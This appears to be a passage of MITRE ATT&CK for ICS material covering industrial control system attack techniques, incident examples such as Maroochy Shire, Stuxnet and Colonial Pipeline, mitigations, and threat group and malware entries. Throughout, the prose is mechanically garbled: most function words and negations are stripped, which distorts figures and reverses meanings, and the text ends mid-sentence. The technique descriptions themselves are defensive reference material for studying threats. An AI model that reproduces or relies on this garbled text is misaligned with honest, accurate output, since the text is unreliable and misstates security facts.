In 2021 Colonial Pipeline ransomware incident, pipeline unable transport 2.5 barrels fuel day East Coast.  (Citation: Colonial Pipeline Company 2021) Adversaries spearphishing attachment, variant spearphishing, form social engineering attack specific targets. Spearphishing attachments forms spearphishing employ malware attached email. forms spearphishing electronically delivered target specific individual, company, industry. scenario, adversaries attach file spearphishing email rely [User Execution](https://attack.mitre.org/techniques/T0863) gain execution access. (Citation: Enterprise ATT&CK October 2019) 

A Chinese spearphishing campaign running December 9, 2011 February 29, 2012, targeted ONG organizations employees. emails constructed level sophistication convince employees malicious file attachments. (Citation: CISA AA21-201A Pipeline Intrusion July 2021) Adversaries perform location identification device data inform operations targeted impact attacks. Location identification data forms, including geographic location, location relative control devices, time zone, current time. adversary embedded global positioning (GPS) module device figure physical coordinates device. NIST SP800-82 recommends devices utilize GPS location determining mechanism attach timestamps log entries (Citation: Guidance - NIST SP800-82). assists logging event tracking, adversary underlying positioning mechanism determine location device. adversary infer physical location serially connected devices serial connection enumeration. 

An adversary attempt attack Impact affect control devices close proximity. Device local-time time-zone settings provide adversaries rough indicator device location, specific geographic identifiers determined system. Adversaries gain access drive-by compromise, user visits regular browsing session. technique, user's browser targeted exploited simply visiting compromised website. 

The adversary target specific community, trusted party suppliers industry specific groups, visit target website. targeted attack relies common interest, strategic compromise watering hole attack. 

The National Cyber Awareness (NCAS) issued Technical Alert (TA) Russian government cyber activity targeting critical infrastructure sectors. (Citation: Cybersecurity & Infrastructure Security Agency March 2018) Analysis DHS FBI distinct categories victims Dragonfly campaign Western energy sector: staging intended targets. adversary targeted secure networks staging targets, including trusted third-party suppliers peripheral organizations. Initial access intended targets watering hole attacks target process control, ICS, critical infrastructure trade publications informational websites. Adversaries damage destruction property infrastructure, equipment, surrounding environment attacking control systems. technique result device operational equipment breakdown, represent tangential damage techniques attack. Depending severity physical damage disruption caused control processes systems, technique result [Loss Safety](https://attack.mitre.org/techniques/T0880). Operations result [Loss Control](https://attack.mitre.org/techniques/T0827) damage property, indirectly motivated adversary seeking impact form [Loss Productivity Revenue](https://attack.mitre.org/techniques/T0828). 

In Maroochy Shire attack, adversary gained remote access control altered data function occurred pumping stations occur occurred way. ultimately led 800,000 liters raw sewage spilled community. raw sewage local parks, rivers, local hotel. harm marine life produced sickening stench community's blackened rivers.(Citation: Marshall Abrams July 2008)

The German Federal Office Security (BSI) reported targeted attack steel incidents business 2014 Security Report. (Citation: BSI Security 2014)  targeted attacks industrial operations breakdowns control components entire installations. result breakdowns, massive impact damage uncontrolled shutdown blast furnace. 

A Polish student remote controller device interface Lodz city tram Poland. (Citation: John 2017) (Citation: Shelley Smith February 2008) (Citation: Bruce Schneier January 2008) remote, student capture replay legitimate tram signals. damage impacted trams, people, surrounding property. Reportedly, trams derailed forced emergency stops. (Citation: Shelley Smith February 2008) Commands issued student tram collisions, causing harm board environment outside. (Citation: Bruce Schneier January 2008) Adversaries spoof reporting messages control environments evasion impair process control. control systems, reporting messages telemetry data I/O values) pertaining current equipment industrial process. Reporting messages monitoring normal operation identifying events deviations expected values. 

If adversary ability Spoof Reporting Messages, impact control ways. adversary Spoof Reporting Messages process operating normally, form evasion. adversary Spoof Reporting Messages defenders operators errors occurring distract actual source problem. (Citation: Bonnie Zhu, Anthony Joseph, Shankar Sastry 2011) 

In Maroochy Shire attack, adversary dedicated analog two-way radio send false data instructions pumping stations central computer.(Citation: Marshall Abrams July 2008) Adversaries exploit software vulnerability advantage programming error program, service, operating software kernel enable remote service abuse. common goal post-compromise exploitation remote services initial access lateral movement ICS environment enable access targeted systems. (Citation: Enterprise ATT&CK)

ICS asset owners operators ransomware (or disruptive malware masquerading ransomware) migrating enterprise ICS environments: WannaCry, NotPetya, BadRabbit. cases, self-propagating (wormable) malware initially infected networks, exploit (particularly SMBv1-targeting MS17-010 vulnerability) spread industrial networks, producing impacts. (Citation: Joe Slowik April 2019) Adversaries leverage manufacturer supplier set default credentials control devices. default credentials administrative permissions initial configuration device. practice change passwords accounts possible, manufacturers devices passwords usernames changed. (Citation: Keith Stouffer 2015)

Default credentials documented instruction manual packaged device, published online official means, published online unofficial means. Adversaries leverage default credentials properly modified disabled. Adversaries leverage external remote services initial access network. services users connect internal network resources external locations. Examples VPNs, Citrix, access mechanisms. Remote service gateways manage connections credential authentication services. (Citation: Daniel Oakley, Travis Smith, Tripwire)

External remote services administration control system. Often, vendors internal engineering access external remote services control networks corporate network. cases, access enabled internet. remote access enables ease maintenance control remote area, compromise remote access solutions liability. adversary services gain access execute attacks control network. Access valid accounts requirement. 

As entry control network, adversaries searching existing point-to-point VPN implementations trusted party networks remote support employee connections split tunneling enabled. (Citation: Electricity Sharing Analysis Center; SANS Industrial Control Systems March 2016)

In Maroochy Shire attack, adversary gained remote access radio.(Citation: Marshall Abrams July 2008) Adversaries repetitively successively change I/O values perform action. Brute Force I/O achieved changing range I/O values single repeatedly manipulate process function. adversarys goal target environment influence options choose. brute forcing range values, adversary achieve impact targeting specific point. single targeted, adversary generate instability process function point. 

Adversaries Brute Force I/O failures industrial processes. failures result wear equipment damage downstream equipment. Adversaries seek gather current program PLC. reveals program, including running, halted, stopped, generated exception. leveraged verification malicious program execution determine PLC ready download program. Adversaries privileged network access seek modify network traffic real time adversary-in-the-middle (AiTM) attacks. (Citation: Gabriel Sanchez October 2017) type attack adversary intercept traffic device network. AiTM attack established, adversary ability block, log, modify, inject traffic communication stream. accomplish attack, most-common Address Resolution Protocol (ARP) poisoning proxy. (Citation: Bonnie Zhu, Anthony Joseph, Shankar Sastry 2011)  

An AiTM attack adversary perform attacks:  
[Block Reporting Message](https://attack.mitre.org/techniques/T0804), [Spoof Reporting Message](https://attack.mitre.org/techniques/T0856), [Modify Parameter](https://attack.mitre.org/techniques/T0836), [Unauthorized Command Message](https://attack.mitre.org/techniques/T0855) Adversaries exploit software vulnerability advantage programming error program, service, operating software kernel evade detection. Vulnerabilities exist software disable circumvent security features.  

Adversaries prior knowledge [Remote Discovery](https://attack.mitre.org/techniques/T0888) security features implemented control devices. device security features targeted exploitation. examples firmware RAM/ROM consistency checks control devices targeted adversaries enable installation malicious [System Firmware](https://attack.mitre.org/techniques/T0857). Adversaries seek achieve sustained loss control runaway condition operators issue commands malicious interference subsided. (Citation: Corero) (Citation: Michael J. Assante Robert M. Lee) (Citation: Tyson Macaulay)

The German Federal Office Security (BSI) reported targeted attack steel 2014 Security Report.(Citation: BSI Security 2014) targeted attacks industrial operations breakdowns control components entire installations. result breakdowns, massive impact damage unsafe conditions uncontrolled shutdown blast furnace. Adversaries attempt change current program control device. Program program control loaded device. Adversaries hook application programming interface (API) functions processes redirect calls execution privilege escalation means. Windows processes leverage API functions perform tasks require reusable resources. Windows API functions typically stored dynamic-link libraries (DLLs) exported functions. (Citation: Enterprise ATT&CK)

One type hooking ICS involves redirecting calls functions import address table (IAT) hooking. IAT hooking modifications processs IAT, pointers imported API functions stored. (Citation: Nicolas Falliere, Liam Murchu, Eric Chien February 2011) Adversaries perform control device identification determine model target device. Management software device APIs utilized adversary gain information. identifying obtaining device specifics, adversary determine device vulnerabilities. device understand device functionality inform decision target environment. Program Organizational Units (POUs) block structures PLC programming create programs projects. (Citation: Guidance - IEC61131) POUs hold user programs written IEC 61131-3 languages: Structured text, Instruction list, Function block, Ladder logic. (Citation: Guidance - IEC61131) Application - 201203 provide additional functionality, establishing connections PLC devices TCON. (Citation: PLCBlaster - Spenneberg)
  
Stuxnet simple code-prepending infection technique infect Organization Blocks (OB). example, sequence actions performed OB1 infected  (Citation: Stuxnet - Symantec - 201102):
*Increase size original block.
*Write malicious code block.
*Insert original OB1 code malicious code. Adversaries attempt gain access machine Graphical User Interface (GUI) enhance execution capabilities. Access GUI user interact visual manner CLI. GUI users cursor interface objects, mouse keyboard main input devices, opposed keyboard.

If physical access option, access protocols VNC Linux-based Unix-based operating systems, RDP Windows operating systems. adversary access execute programs applications target machine. Adversaries setup rogue master leverage control server functions communicate outstations. rogue master send legitimate control messages control devices, processes unintended ways. disrupt network communications capturing receiving network traffic meant actual master. Impersonating master adversary avoid detection. 

In Maroochy Shire attack, adversary falsified network addresses send false data instructions pumping stations.(Citation: Marshall Abrams July 2008)

In 2017 Dallas Siren incident, adversaries rogue master send command messages 156 distributed sirens city, single rogue transmitter strong signal, distributed repeaters. (Citation: Bastille April 2017) (Citation: Zack Whittaker April 2017) Adversaries interact native OS application programming interface (API) access functions. Native APIs provide controlled calling low-level OS services kernel, involving hardware/devices, memory, processes. (Citation: MITRE Corporation 2017) native APIs leveraged OS boot (when components initialized) carrying tasks requests routine operations. 

Functionality native APIs exposed user-mode applications interfaces libraries. example, functions memcpy direct operations memory registers modify user memory space. Adversaries attempt disrupt essential components systems prevent owner operator delivering products services. (Citation: Corero) (Citation: Michael J. Assante Robert M. Lee) (Citation: Tyson Macaulay) 

Adversaries leverage malware delete encrypt critical data HMIs, workstations, databases.

In 2021 Colonial Pipeline ransomware incident, pipeline operations temporally halted 7th restarted 12th. (Citation: Colonial Pipeline Company 2021) Adversaries steal operational production environment direct mission outcome personal gain inform future operations. include design documents, schedules, rotational data, artifacts provide insight operations.    Bowman Dam incident, adversaries probed systems operational data. (Citation: Mark Thompson March 2016) (Citation: Danny Yadron December 2015) firmware modern assets designed update feature. device firmware factory installed require special reprograming equipment. available, firmware update feature enables vendors remotely patch bugs perform upgrades. Device firmware updates delegated user software update package. perform task network. 

An adversary exploit firmware update feature accessible devices upload malicious out-of-date firmware. Malicious modification device firmware provide adversary root access device, firmware lowest programming abstraction layers. (Citation: Basnight, Zachry, al.) Adversaries masquerading disguise malicious application executable file, avoid operator engineer suspicion. disguises masquerading files include commonly programs, expected vendor executables configuration files, commonplace application naming conventions. impersonating expected vendor-relevant files applications, operators engineers notice presence underlying malicious content running masquerading legitimate functions. 

Applications files commonly Windows systems engineering workstations impersonated before. simple renaming file effectively disguise ICS environment. Adversaries perform program download transfer user program controller. 

Variations program download, online edit program append, controller continue running transfer reconfiguration process interruption process control. However, starting program download (i.e., download all) controller state. negative consequences physical process, controller fulfill time-sensitive action. Adversaries choose avoid download favor online edit program append avoid disrupting physical process. adversary technique Detect Operating Mode Change Operating Mode controller proper mode accept program download.

The granularity control transfer user program dictated management protocol S7CommPlus, TriStation) underlying controller API. Thus, program download high-level term suite vendor-specific API calls configure controllers user program memory space.  

[Modify Controller Tasking](https://attack.mitre.org/techniques/T0821) [Modify Program](https://attack.mitre.org/techniques/T0889) represent configuration transferred controller program download. Adversaries systems, separated enterprise network, copying malware removable media inserted control systems environment. adversary rely unknowing trusted parties, suppliers contractors access privileges, introduce removable media. technique enables initial access target devices connect untrusted networks, physically accessible.     

Operators German nuclear power plant, Gundremmingen, discovered malware facility connected internet. (Citation: Kernkraftwerk Gundremmingen April 2016) (Citation: Trend Micro April 2016) malware included Conficker W32.Ramnit, eighteen removable disk drives facility. (Citation: Christoph Steitz, Eric Auchard April 2016) (Citation: Catalin Cimpanu April 2016) (Citation: Peter Dockrill April 2016) (Citation: Lee Mathews April 2016) (Citation: Sean Gallagher April 2016) (Citation: Dark Reading Staff April 2016) plant checked infection cleaned 1,000 computers. (Citation: BBC April 2016) ESET researcher commented internet disconnection guarantee safety infection payload execution. (Citation: ESET April 2016) Adversaries attempt perform screen capture devices control environment. Screenshots workstations, HMIs, devices display environment-relevant process, device, reporting, alarm, data. device displays reveal ICS process, layout, control, schematics. particular, HMI provide lot industrial process information. (Citation: ICS-CERT October 2017) Analysis screen captures provide adversary understanding intended operations interactions critical devices. Adversaries leverage credentials hardcoded software firmware gain unauthorized interactive user session asset. Examples credentials hardcoded asset include:

* Username/Passwords
* Cryptographic keys/Certificates
* API tokens

Unlike [Default Credentials](https://attack.mitre.org/techniques/T0812), credentials built changed asset owner, infeasible change impact control operation. credentials reused product lines device models published owner operators asset. 

Adversaries utilize hardcoded credentials control environment provide reliable access tools interact industrial assets. 
 Adversaries steal credentials specific user service account credential access techniques. cases, default credentials control devices publicly available. Compromised credentials bypass access controls resources hosts network, persistent access remote systems. Compromised default credentials grant adversary increased privilege specific systems devices access restricted network. Adversaries choose malware tools, conjunction legitimate access credentials provide, harder detect presence control devices send legitimate commands unintended way. 

Adversaries create accounts, predefined account names passwords, provide backup access persistence. (Citation: Booz Allen Hamilton) 

The overlap credentials permissions network systems concern adversary pivot accounts systems reach level access (i.e., domain enterprise administrator)  enterprise operational technology environments. Adversaries leverage valid credentials gain access system. Adversaries exploit software vulnerabilities attempt elevate privileges. Exploitation software vulnerability occurs adversary takes advantage programming error program, service, operating software kernel execute adversary-controlled code. Security constructs permission levels hinder access techniques, adversaries perform privilege escalation include software exploitation circumvent restrictions. (Citation: MITRE Corporation) 

When initially gaining access system, adversary operating privileged process prevent accessing resources system. Vulnerabilities exist, operating components software commonly running permissions, exploited gain levels access system. enable unprivileged user level permissions root permissions depending component vulnerable. step adversary compromising endpoint properly configured limits privilege escalation methods. (Citation: MITRE Corporation) Adversaries attempt listing systems IP address, hostname, logical identifier network subsequent Lateral Movement Discovery techniques. Functionality exist adversary tools enable this, utilities operating vendor software used. (Citation: Enterprise ATT&CK January 2018) Adversaries compromise gain control engineering workstation Initial Access control environment. Access engineering workstation occur physical means, Valid Accounts privileged access infection removable media. dual-homed engineering workstation adversary access multiple networks. example, unsegregated process control, safety system, networks. Engineering Workstation designed reliable computing platform configures, maintains, diagnoses control equipment applications. Compromise engineering workstation provide access to, control of, control applications equipment. Maroochy attack, adversary utilized computer, stolen, proprietary engineering software communicate wastewater system. Adversaries connection proxy direct network traffic systems intermediary network communications.

The definition proxy expanded encompass trust relationships networks peer-to-peer, mesh, trusted connections networks consisting hosts systems regularly communicate other.

The network single organization multiple organizations trust relationships. Adversaries types relationships manage command control communications, reduce simultaneous outbound network connections, provide resiliency connection loss, ride existing trusted communications paths victims avoid suspicion. (Citation: Enterprise ATT&CK January 2018) Adversaries establish command control capabilities commonly application layer protocols HTTP(S), OPC, RDP, telnet, DNP3, modbus. protocols disguise adversary actions benign network traffic. Standard protocols port non-standard port.  Adversaries protocols reach network command control, infected devices network. Adversaries malicious code system, malfunction modifying control logic. Control devices programming languages (e.g. relay ladder logic) control physical processes actuators, machines operate, based environment sensor readings. devices include ability perform remote control logic updates. 

Program code edited vendor-specific Integrated Development Environment (IDE) relies proprietary tools features. IDEs engineer perform host target development ability code machine programmed for. IDE transmit control logic testing device, perform required device-specific functions apply active.

An adversary attempt host target IDE modify device control logic. proprietary tools edit update control logic, process reverse-engineered reproduced open-source tools.

An adversary de-calibrate sensor removing functions control logic account sensor error. change control process spoofing command messages controller device. 

It believed process happened lesser over-pressurizer attacks build Stuxnet. Pressure sensors perfect translating pressure analog output signal, errors corrected calibration. pressure controller told “real” pressure analog signals automatically linearize measurement “real” pressure. linearization overwritten malicious code S7-417 controller, analog pressure readings “corrected” attack pressure controller, interprets analog pressure readings perfectly normal pressure matter analog values are. pressure controller acts stage exhaust valves. meantime, actual pressure rising. (Citation: Stuxnet - Langner - 201311)

In Maroochy Attack, Vitek Boden gained remote access control altered data function occurred pumping stations occur occurred way. software program installed laptop developed Hunter Watertech changing configurations PDS computers. ultimately led 800,000 liters raw sewage spilled community. (Citation: Maroochy - MITRE - 200808) Adversaries leverage remote services assets network segments. services operators interact systems remotely network, examples RDP, SMB, SSH, mechanisms. (Citation: Blake Johnson, Dan Caban, Marina Krotofil, Dan Scali, Nathan Brubaker, Christopher Glyer December 2017) (Citation: Dragos December 2017) (Citation: Joe Slowik April 2019) 

Remote services support remote access, data transmission, authentication, resolution, remote functions. Further, remote services operators administrators configure systems network engineering management workstations. adversary technique access devices dual-homed (Citation: Blake Johnson, Dan Caban, Marina Krotofil, Dan Scali, Nathan Brubaker, Christopher Glyer December 2017) multiple network segments, [Program Download](https://attack.mitre.org/techniques/T0843) execute attacks control devices [Valid Accounts](https://attack.mitre.org/techniques/T0859).

Specific remote services (RDP & VNC) precursor enable [Graphical User Interface](https://attack.mitre.org/techniques/T0823) execution devices HMIs engineering workstation software.

Based incident data, CISA FBI assessed Chinese state-sponsored actors compromised authorized remote access channels, including systems designed transfer data access corporate ICS networks.  (Citation: CISA AA21-201A Pipeline Intrusion July 2021) Adversaries input/output (I/O) module discovery gather key control device. I/O module device control device receive send signals devices. signals analog digital, support protocols. Devices attachable I/O modules increase inputs outputs utilize. adversary access device native device functions enumerate I/O modules connected device. I/O modules aid adversary understanding control processes. Adversaries denial control temporarily prevent operators engineers interacting process controls. adversary attempt deny process control access temporary loss communication control device prevent operator adjustment process controls. process operating period control loss, desired state. (Citation: Corero) (Citation: Michael J. Assante Robert M. Lee) (Citation: Tyson Macaulay)

In Maroochy Shire attack, adversary temporarily shut investigator network preventing issuing controls.(Citation: Marshall Abrams July 2008)

In 2017 Dallas Siren incident operators unable disable false alarms Office Emergency Management headquarters. (Citation: Mark Loveless April 2017) Adversaries modify alarm settings prevent alerts inform operators presence prevent responses dangerous unintended scenarios. Reporting messages standard data acquisition control systems. Reporting messages transmit acknowledgements specific actions occurred. messages provide vital management physical process, operators, engineers, administrators aware devices physical processes. 

If adversary change reporting settings, events prevented reported. type modification prevent operators devices performing actions safe state. critical reporting messages trigger actions [Impact](http://attacksite.mitre.org/tactics/TA0105/) occur. 

In ICS environments, adversary [Alarm Suppression](https://attack.mitre.org/techniques/T0878) contend multiple alarms alarm propagation achieve specific goal evade detection prevent intended responses occurring. (Citation: Jos Wetzels, Marina Krotofil 2019)  Methods suppression rely modification alarm settings, modifying memory code fixed values tampering assembly level instruction code. 

In Maroochy Shire attack, adversary disabled alarms pumping stations. caused alarms reported central computer.(Citation: Marshall Abrams July 2008) Adversaries communicate commonly port bypass firewalls network detection systems blend normal network activity, avoid detailed inspection. protocol port, completely protocol. commonly ports, examples below. 
 
 * TCP:80 (HTTP) 
 * TCP:443 (HTTPS) 
 * TCP/UDP:53 (DNS) 
 * TCP:1024-4999 (OPC XP/Win2k3) 
 * TCP:49152-65535 (OPC Vista later) 
 * TCP:23 (TELNET) 
 * UDP:161 (SNMP) 
 * TCP:502 (MODBUS) 
 * TCP:102 (S7comm/ISO-TSAP) 
 * TCP:20000 (DNP3) 
 * TCP:44818 (Ethernet/IP) Adversaries attempt infect project files malicious code. project files consist objects, program organization units, variables tags, documentation, configurations PLC programs function. (Citation: Beckhoff) built functions engineering software, adversaries download infected program PLC operating environment enabling [execution](http://attacksite.mitre.org/tactics/TA0104/) [persistence](http://attacksite.mitre.org/tactics/TA0110/) techniques. (Citation: PLCdev) 

Adversaries export code project files conditions execute specific intervals. (Citation: Nicolas Falliere, Liam Murchu, Eric Chien February 2011) Malicious programs adversaries control aspects process enabled PLC. project file downloaded PLC workstation device disconnected infected project file executing. (Citation: PLCdev) Adversaries perform network connection enumeration discover device communication patterns. adversary inspect network connection tools, Netstat(Citation: Netstat), conjunction [System Firmware](https://attack.mitre.org/techniques/T0857), determine role devices network  (Citation: MITRE). adversary [Network Sniffing](https://attack.mitre.org/techniques/T0842) watch network traffic details source, destination, protocol, content. Adversaries transfer tools files stage adversary tools files operation. (Citation: Enterprise ATT&CK) Copying files performed laterally internal victim systems support Lateral Movement remote Execution inherent file sharing protocols file sharing SMB connected network shares. (Citation: Enterprise ATT&CK)

In control systems environments, malware SMB file sharing protocols laterally industrial networks. Adversaries install malicious vulnerable firmware modular hardware devices. Control devices modular hardware devices. devices set firmware separate firmware main control equipment.   

This technique [System Firmware](https://attack.mitre.org/techniques/T0857), conducted components capabilities level integrity checking. device re-image, malicious device firmware provide persistent access remaining devices. (Citation: Daniel Peck,  Dale Peterson January 2009)  

An easy access adversary Ethernet card, CPU, RAM, operating system. adversary attack exploit Ethernet card. Exploitation Ethernet card enable adversary accomplish additional attacks, following: (Citation: Daniel Peck,  Dale Peterson January 2009)  

* Delayed Attack - adversary stage attack advance choose launch it, damaging time.  
* Brick Ethernet Card - Malicious firmware programmed result Ethernet card failure, requiring factory return.  
* Random Attack Failure - adversary load malicious firmware multiple field devices. Execution attack time occurs generated pseudo-random generator.   
* Field Device Worm - adversary choose identify field devices model, goal performing device-wide compromise.  
* Attack Cards Field Device - module field device, Ethernet card accessible adversary malware. Compromise Ethernet card provide direct route compromising modules, CPU module. Adversaries gain access industrial environments systems exposed internet remote access [External Remote Services](https://attack.mitre.org/techniques/T0822). Internet Accessible Devices exposed internet unintentionally intentionally adequate protections. adversaries control network. Access devices accomplished exploits, represented [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T0819) technique.

Adversaries leverage built functions remote access protected utilize minimal legacy protections targeted. (Citation: NCCIC January 2014) services discoverable online scanning tools. 

In Bowman dam incident, adversaries leveraged access dam control network cellular modem. Access device protected password authentication, application vulnerable brute forcing. (Citation: NCCIC January 2014) (Citation: Danny Yadron December 2015) (Citation: Mark Thompson March 2016)

In Trend Micros manufacturing deception operations adversaries detected leveraging direct internet access ICS environment exposure operational protocols Siemens S7, Omron FINS, EtherNet/IP, addition misconfigured VNC access. (Citation: Stephen Hilt, Federico Maggi, Charles Perine, Lord Remorin, Martin Rsler, Rainer Vosseler) Adversaries modify add program controller affect interacts physical process, peripheral devices hosts network. Modification controller programs accomplished Program Download addition types program modification online edit program append. 

Program modification encompasses addition modification instructions logic contained Program Organization Units (POU)  (Citation: IEC February 2013) programming elements controllers. include, example, adding functions controller, modifying logic existing functions calls function another. 

Some programs adversary interact native API controller advantage obscure features vulnerabilities. [Oldsmar Treatment Plant Intrusion](https://attack.mitre.org/campaigns/C0009) cyber incident involving water treatment facility Florida. incident, unidentified threat actors leveraged features access modify setpoints specific chemical required treatment process. incident detected prevented harm public.(Citation: Pinellas County Sheriffs Office February 2021)(Citation: CISA AA21-042A Water Treatment Intrusion Feb 2021)(Citation: Dragos Oldsmar Feb 2021) Restrict execution code virtual environment in-transit endpoint system. network appliances filter ingress egress traffic perform protocol-based filtering. Configure software endpoints filter network traffic.   Perform inline allow/denylisting network messages based application layer (OSI Layer 7) protocol, automation protocols. Application allowlists beneficial well-defined communication sequences, types, rates, patterns expected operations. Application denylists acceptable communication sequences defined, set malicious denied excessive communication  attempts, shutdown messages, invalid commands).  Devices performing functions referred deep-packet inspection (DPI) firewalls, context-aware firewalls, firewalls blocking specific automation/SCADA protocol aware firewalls. (Citation: Centre Protection National Infrastructure February 2005) Restrict websites, block downloads/attachments, block Javascript, restrict browser extensions, etc. Architect sections network isolate critical systems, functions, resources. physical logical segmentation prevent access sensitive systems information. DMZ internet-facing services exposed internal network.  Restrict network access required systems services. addition, prevent systems networks business functions enterprise) accessing critical process control systems. example, IEC 62443, systems secure level zone, access zone restricted conduit, mechanism restrict data flows zones segmenting network. (Citation: IEC February 2019) (Citation: IEC August 2013) Prevent abuse library loading mechanisms operating software load untrusted code configuring library loading mechanisms investigating potential vulnerable software. Configure Active Directory prevent techniques; security identifier (SID) Filtering, etc. intrusion detection signatures block traffic network boundaries.  industrial control environments, network intrusion prevention configured disrupt protocols communications responsible real-time functions control safety. Restrict ability modify hives Windows Registry. Data Loss Prevention (DLP) technologies identify adversarial attempts exfiltrate operational information, engineering plans, trade secrets, recipes, intellectual property, process telemetry. DLP functionality built security products firewalls standalone suites running network host-based agents. DLP configured prevent transfer corporate resources email, web, physical media USB host-based solutions. Access Management technologies enforce authorization polices decisions, existing field devices sufficient capabilities support user identification authentication. (Citation: McCarthy, al. July 2018) technologies typically utilize in-line network device gateway prevent access unauthenticated users, integrating authentication service verify user credentials. (Citation: Centre Protection National Infrastructure November 2010) type attack technique easily mitigated preventative controls based abuse features. capabilities detect block conditions lead indicative software exploit occurring. Prevent access file shares, remote access systems, unnecessary services. Mechanisms limit access include network concentrators, RDP gateways, etc. Block execution code application control, script blocking. Configure hosts devices static network configurations possible, protocols require dynamic discovery/addressing ARP, DHCP, DNS) manipulate network message forwarding enable MitM attacks. mitigation usable limited device features challenges introduced network configurations. Set enforce secure password policies accounts. Manage creation, modification, use, permissions privileged accounts, including root. Require user authentication allowing access data accepting commands device. strong multi-factor authentication preferable, feasible ICS environments. Performing strong user authentication requires additional security controls processes target adversarial techniques Valid Accounts, Default Credentials). Therefore, ATT&CK mitigations considered addition this, including [Multi-factor Authentication](https://attack.mitre.org/mitigations/M0932), [Account Policies](https://attack.mitre.org/mitigations/M0936), [Password Policies](https://attack.mitre.org/mitigations/M0927), [User Account Management](https://attack.mitre.org/mitigations/M0918), [Privileged Account Management](https://attack.mitre.org/mitigations/M0926), [https://attack.mitre.org/mitigations/M1052/ User Account Control]. Break inspect SSL/TLS sessions encrypted traffic adversary activity. Enforce binary application integrity digital signature verification prevent untrusted code executing. Require authentication devices software processes appropriate. Devices connect remotely systems require strong authentication prevent spoofing communications. Furthermore, software processes require authentication accessing APIs. Utilize strong cryptographic techniques protocols prevent eavesdropping network communications. Configure features account login attempt lockouts, specific login times, etc. mitigation describes guidance training developers applications avoid introducing security weaknesses adversary advantage of. secure methods boot verify integrity operating loading mechanisms. Utilize layered protection design based physical mechanical protection systems prevent damage property, equipment, human safety, environment. Examples include interlocks, rupture disk, release values, etc. (Citation: Foord, Gulland, Howard, Kellacher, Smith 2004)  Perform regular software updates mitigate exploitation risk. Software updates scheduled operational times. Utilize watchdog timers ensure devices detect unresponsive. Deploy mechanisms protect confidentiality operational processes, facility locations, device configurations, programs, databases infer organizational trade-secrets, recipes, intellectual property (IP). configuration operating common feature operating result hardening techniques. Block users installing unapproved hardware systems, including USB devices. Protect sensitive data-at-rest strong encryption. Network allowlists implemented host-based files hosts files connections IP address, MAC address, port, protocol) device. Allowlist techniques operate  application layer DNP3, Modbus, HTTP) addressed [Filter Network Traffic](https://attack.mitre.org/mitigations/M0937) mitigation. Implement supply chain management program, including policies procedures ensure devices components originate trusted supplier tested verify integrity. store data backups user systems critical servers. Ensure backup storage systems hardened separate corporate network prevent compromise.   Maintain exercise incident response plans  (Citation: Department Homeland Security October 2009), including management  'gold-copy' back-up images configurations key systems enable quick recovery response adversarial activities impact control, view, availability. alternative methods support communication requirements communication failures data integrity attacks. (Citation: National Institute Standards Technology April 2013) (Citation: Defense Advanced Projects Agency) Perform audits scans systems, permissions, insecure software, insecure configurations, etc. identify potential weaknesses. Perform periodic integrity checks device validate correctness firmware, software, programs, configurations. Integrity checks, typically include cryptographic hashes digital signatures, compared valid states, events device reboots, program downloads, program restarts. communicating untrusted network, utilize secure network protocols authenticate message sender verify integrity. message authentication codes (MACs) digital signatures, detect spoofed network messages unauthorized connections. Remove deny access unnecessary vulnerable software prevent abuse adversaries. threat intelligence program helps organization generate threat intelligence track trends inform defensive priorities mitigate risk. Utilize Safety Instrumented Systems (SIS) provide additional layer protection hazard scenarios property damage. SIS typically include sensors, logic solvers, final control element automatically respond hazardous condition  (Citation: Foord, Gulland, Howard, Kellacher, Smith 2004) . Ensure SISs segmented operational networks prevent targeted additional adversarial behavior. Train users aware access manipulation attempts adversary reduce risk successful spearphishing, social engineering, techniques involve user interaction. pieces evidence authenticate system; username password addition token physical smart card token generator.  industrial control environments assets low-level controllers, workstations, HMIs real-time operational control safety requirements restrict multi-factor. Vulnerability scanning exploitable software vulnerabilities remediate them. device restrict read, manipulate, execute privileges authenticated users require access based approved security policies.  Role-based Access Control (RBAC) schemes reduce overhead assigning permissions devices ICS. example, IEC 62351 examples roles support common operations electric power sector  (Citation: International Electrotechnical Commission July 2020), IEEE 1686 defines standard permissions users IEDs. (Citation: Institute Electrical Electronics Engineers January 2014) Manage creation, modification, use, permissions user accounts. Redundancy critical ICS devices services, back-up devices hot-standbys. Restrict access setting directory file permissions specific users privileged accounts. Implement configuration software (other operating system) mitigate security risks software operates. signatures heuristics detect malicious software.  industrial control environments, antivirus/antimalware installations limited assets involved critical real-time operations. minimize impact availability, products validated representative environment deployment production systems. (Citation: NCCIC August 2018) Wireless signals frequently propagate organizational boundaries, provide opportunities adversaries monitor gain unauthorized access wireless network. (Citation: CISA March 2010) minimize threat, organizations implement measures detect, understand, reduce unnecessary RF propagation. (Citation: DHS  National Urban Security Technology Laboratory April 2019) [ALLANITE](https://attack.mitre.org/groups/G1000) suspected Russian cyber espionage group, targeted electric utility sector United United Kingdom. group's tactics techniques reportedly [Dragonfly](https://attack.mitre.org/groups/G0035), [ALLANITE](https://attack.mitre.org/groups/G1000)s technical capabilities exhibited disruptive destructive abilities. suggested maintains presence ICS purpose gaining understanding processes maintain persistence. (Citation: Dragos) [Industroyer](https://collaborate.mitre.org/attackics/index.php/Software/S0001) sophisticated piece malware designed [Impact](https://collaborate.mitre.org/attackics/index.php/Impact) processes Industrial Control Systems (ICS), ICSs electrical substations.(Citation: ESET Win32/Industroyer) Industroyer alleged attacks Ukrainian power grid December 2016.(Citation: Dragos Crashoverride)(Citation: CISA Alert (TA17-163A))(Citation: Dragos Crashoverride 2018)(Citation: Dragos Crashoverride 2019) [Bad Rabbit](https://collaborate.mitre.org/attackics/index.php/Software/S0005) self-propagating (“wormable”) ransomware transportation sector Ukraine. (Citation: ESET Bad Rabbit Oct 2017) [Stuxnet](https://collaborate.mitre.org/attackics/index.php/Software/S0010) publicly reported piece malware target industrial control systems devices. Stuxnet complex piece malware utilized multiple complex tactics including multiple zero-day vulnerabilites, sophisticated Windows rootkit, network infection routines.(Citation: Wired W32.Stuxnet Dossier Feb 2011)(Citation: Symantec W32.Stuxnet Writeup)(Citation: CISA ICS Advisory (ICSA-10-238-01B))(Citation: SCADAhacker Stuxnet Mitigation Jan 2014) [Conficker](https://collaborate.mitre.org/attackics/index.php/Software/S0012) worm targets Windows detected November 2008. targets vulnerability (MS08-067) Windows OS software dictionary attacks administrator passwords propagate forming botnet. Conficker computers removable disk drives nuclear power plant. (Citation: Malware Shuts German Nuclear Power Plant Chernobyl's 30th Anniversary) [PLC-Blaster](https://attack.mitre.org/software/S1006) piece proof-of-concept malware runs Siemens 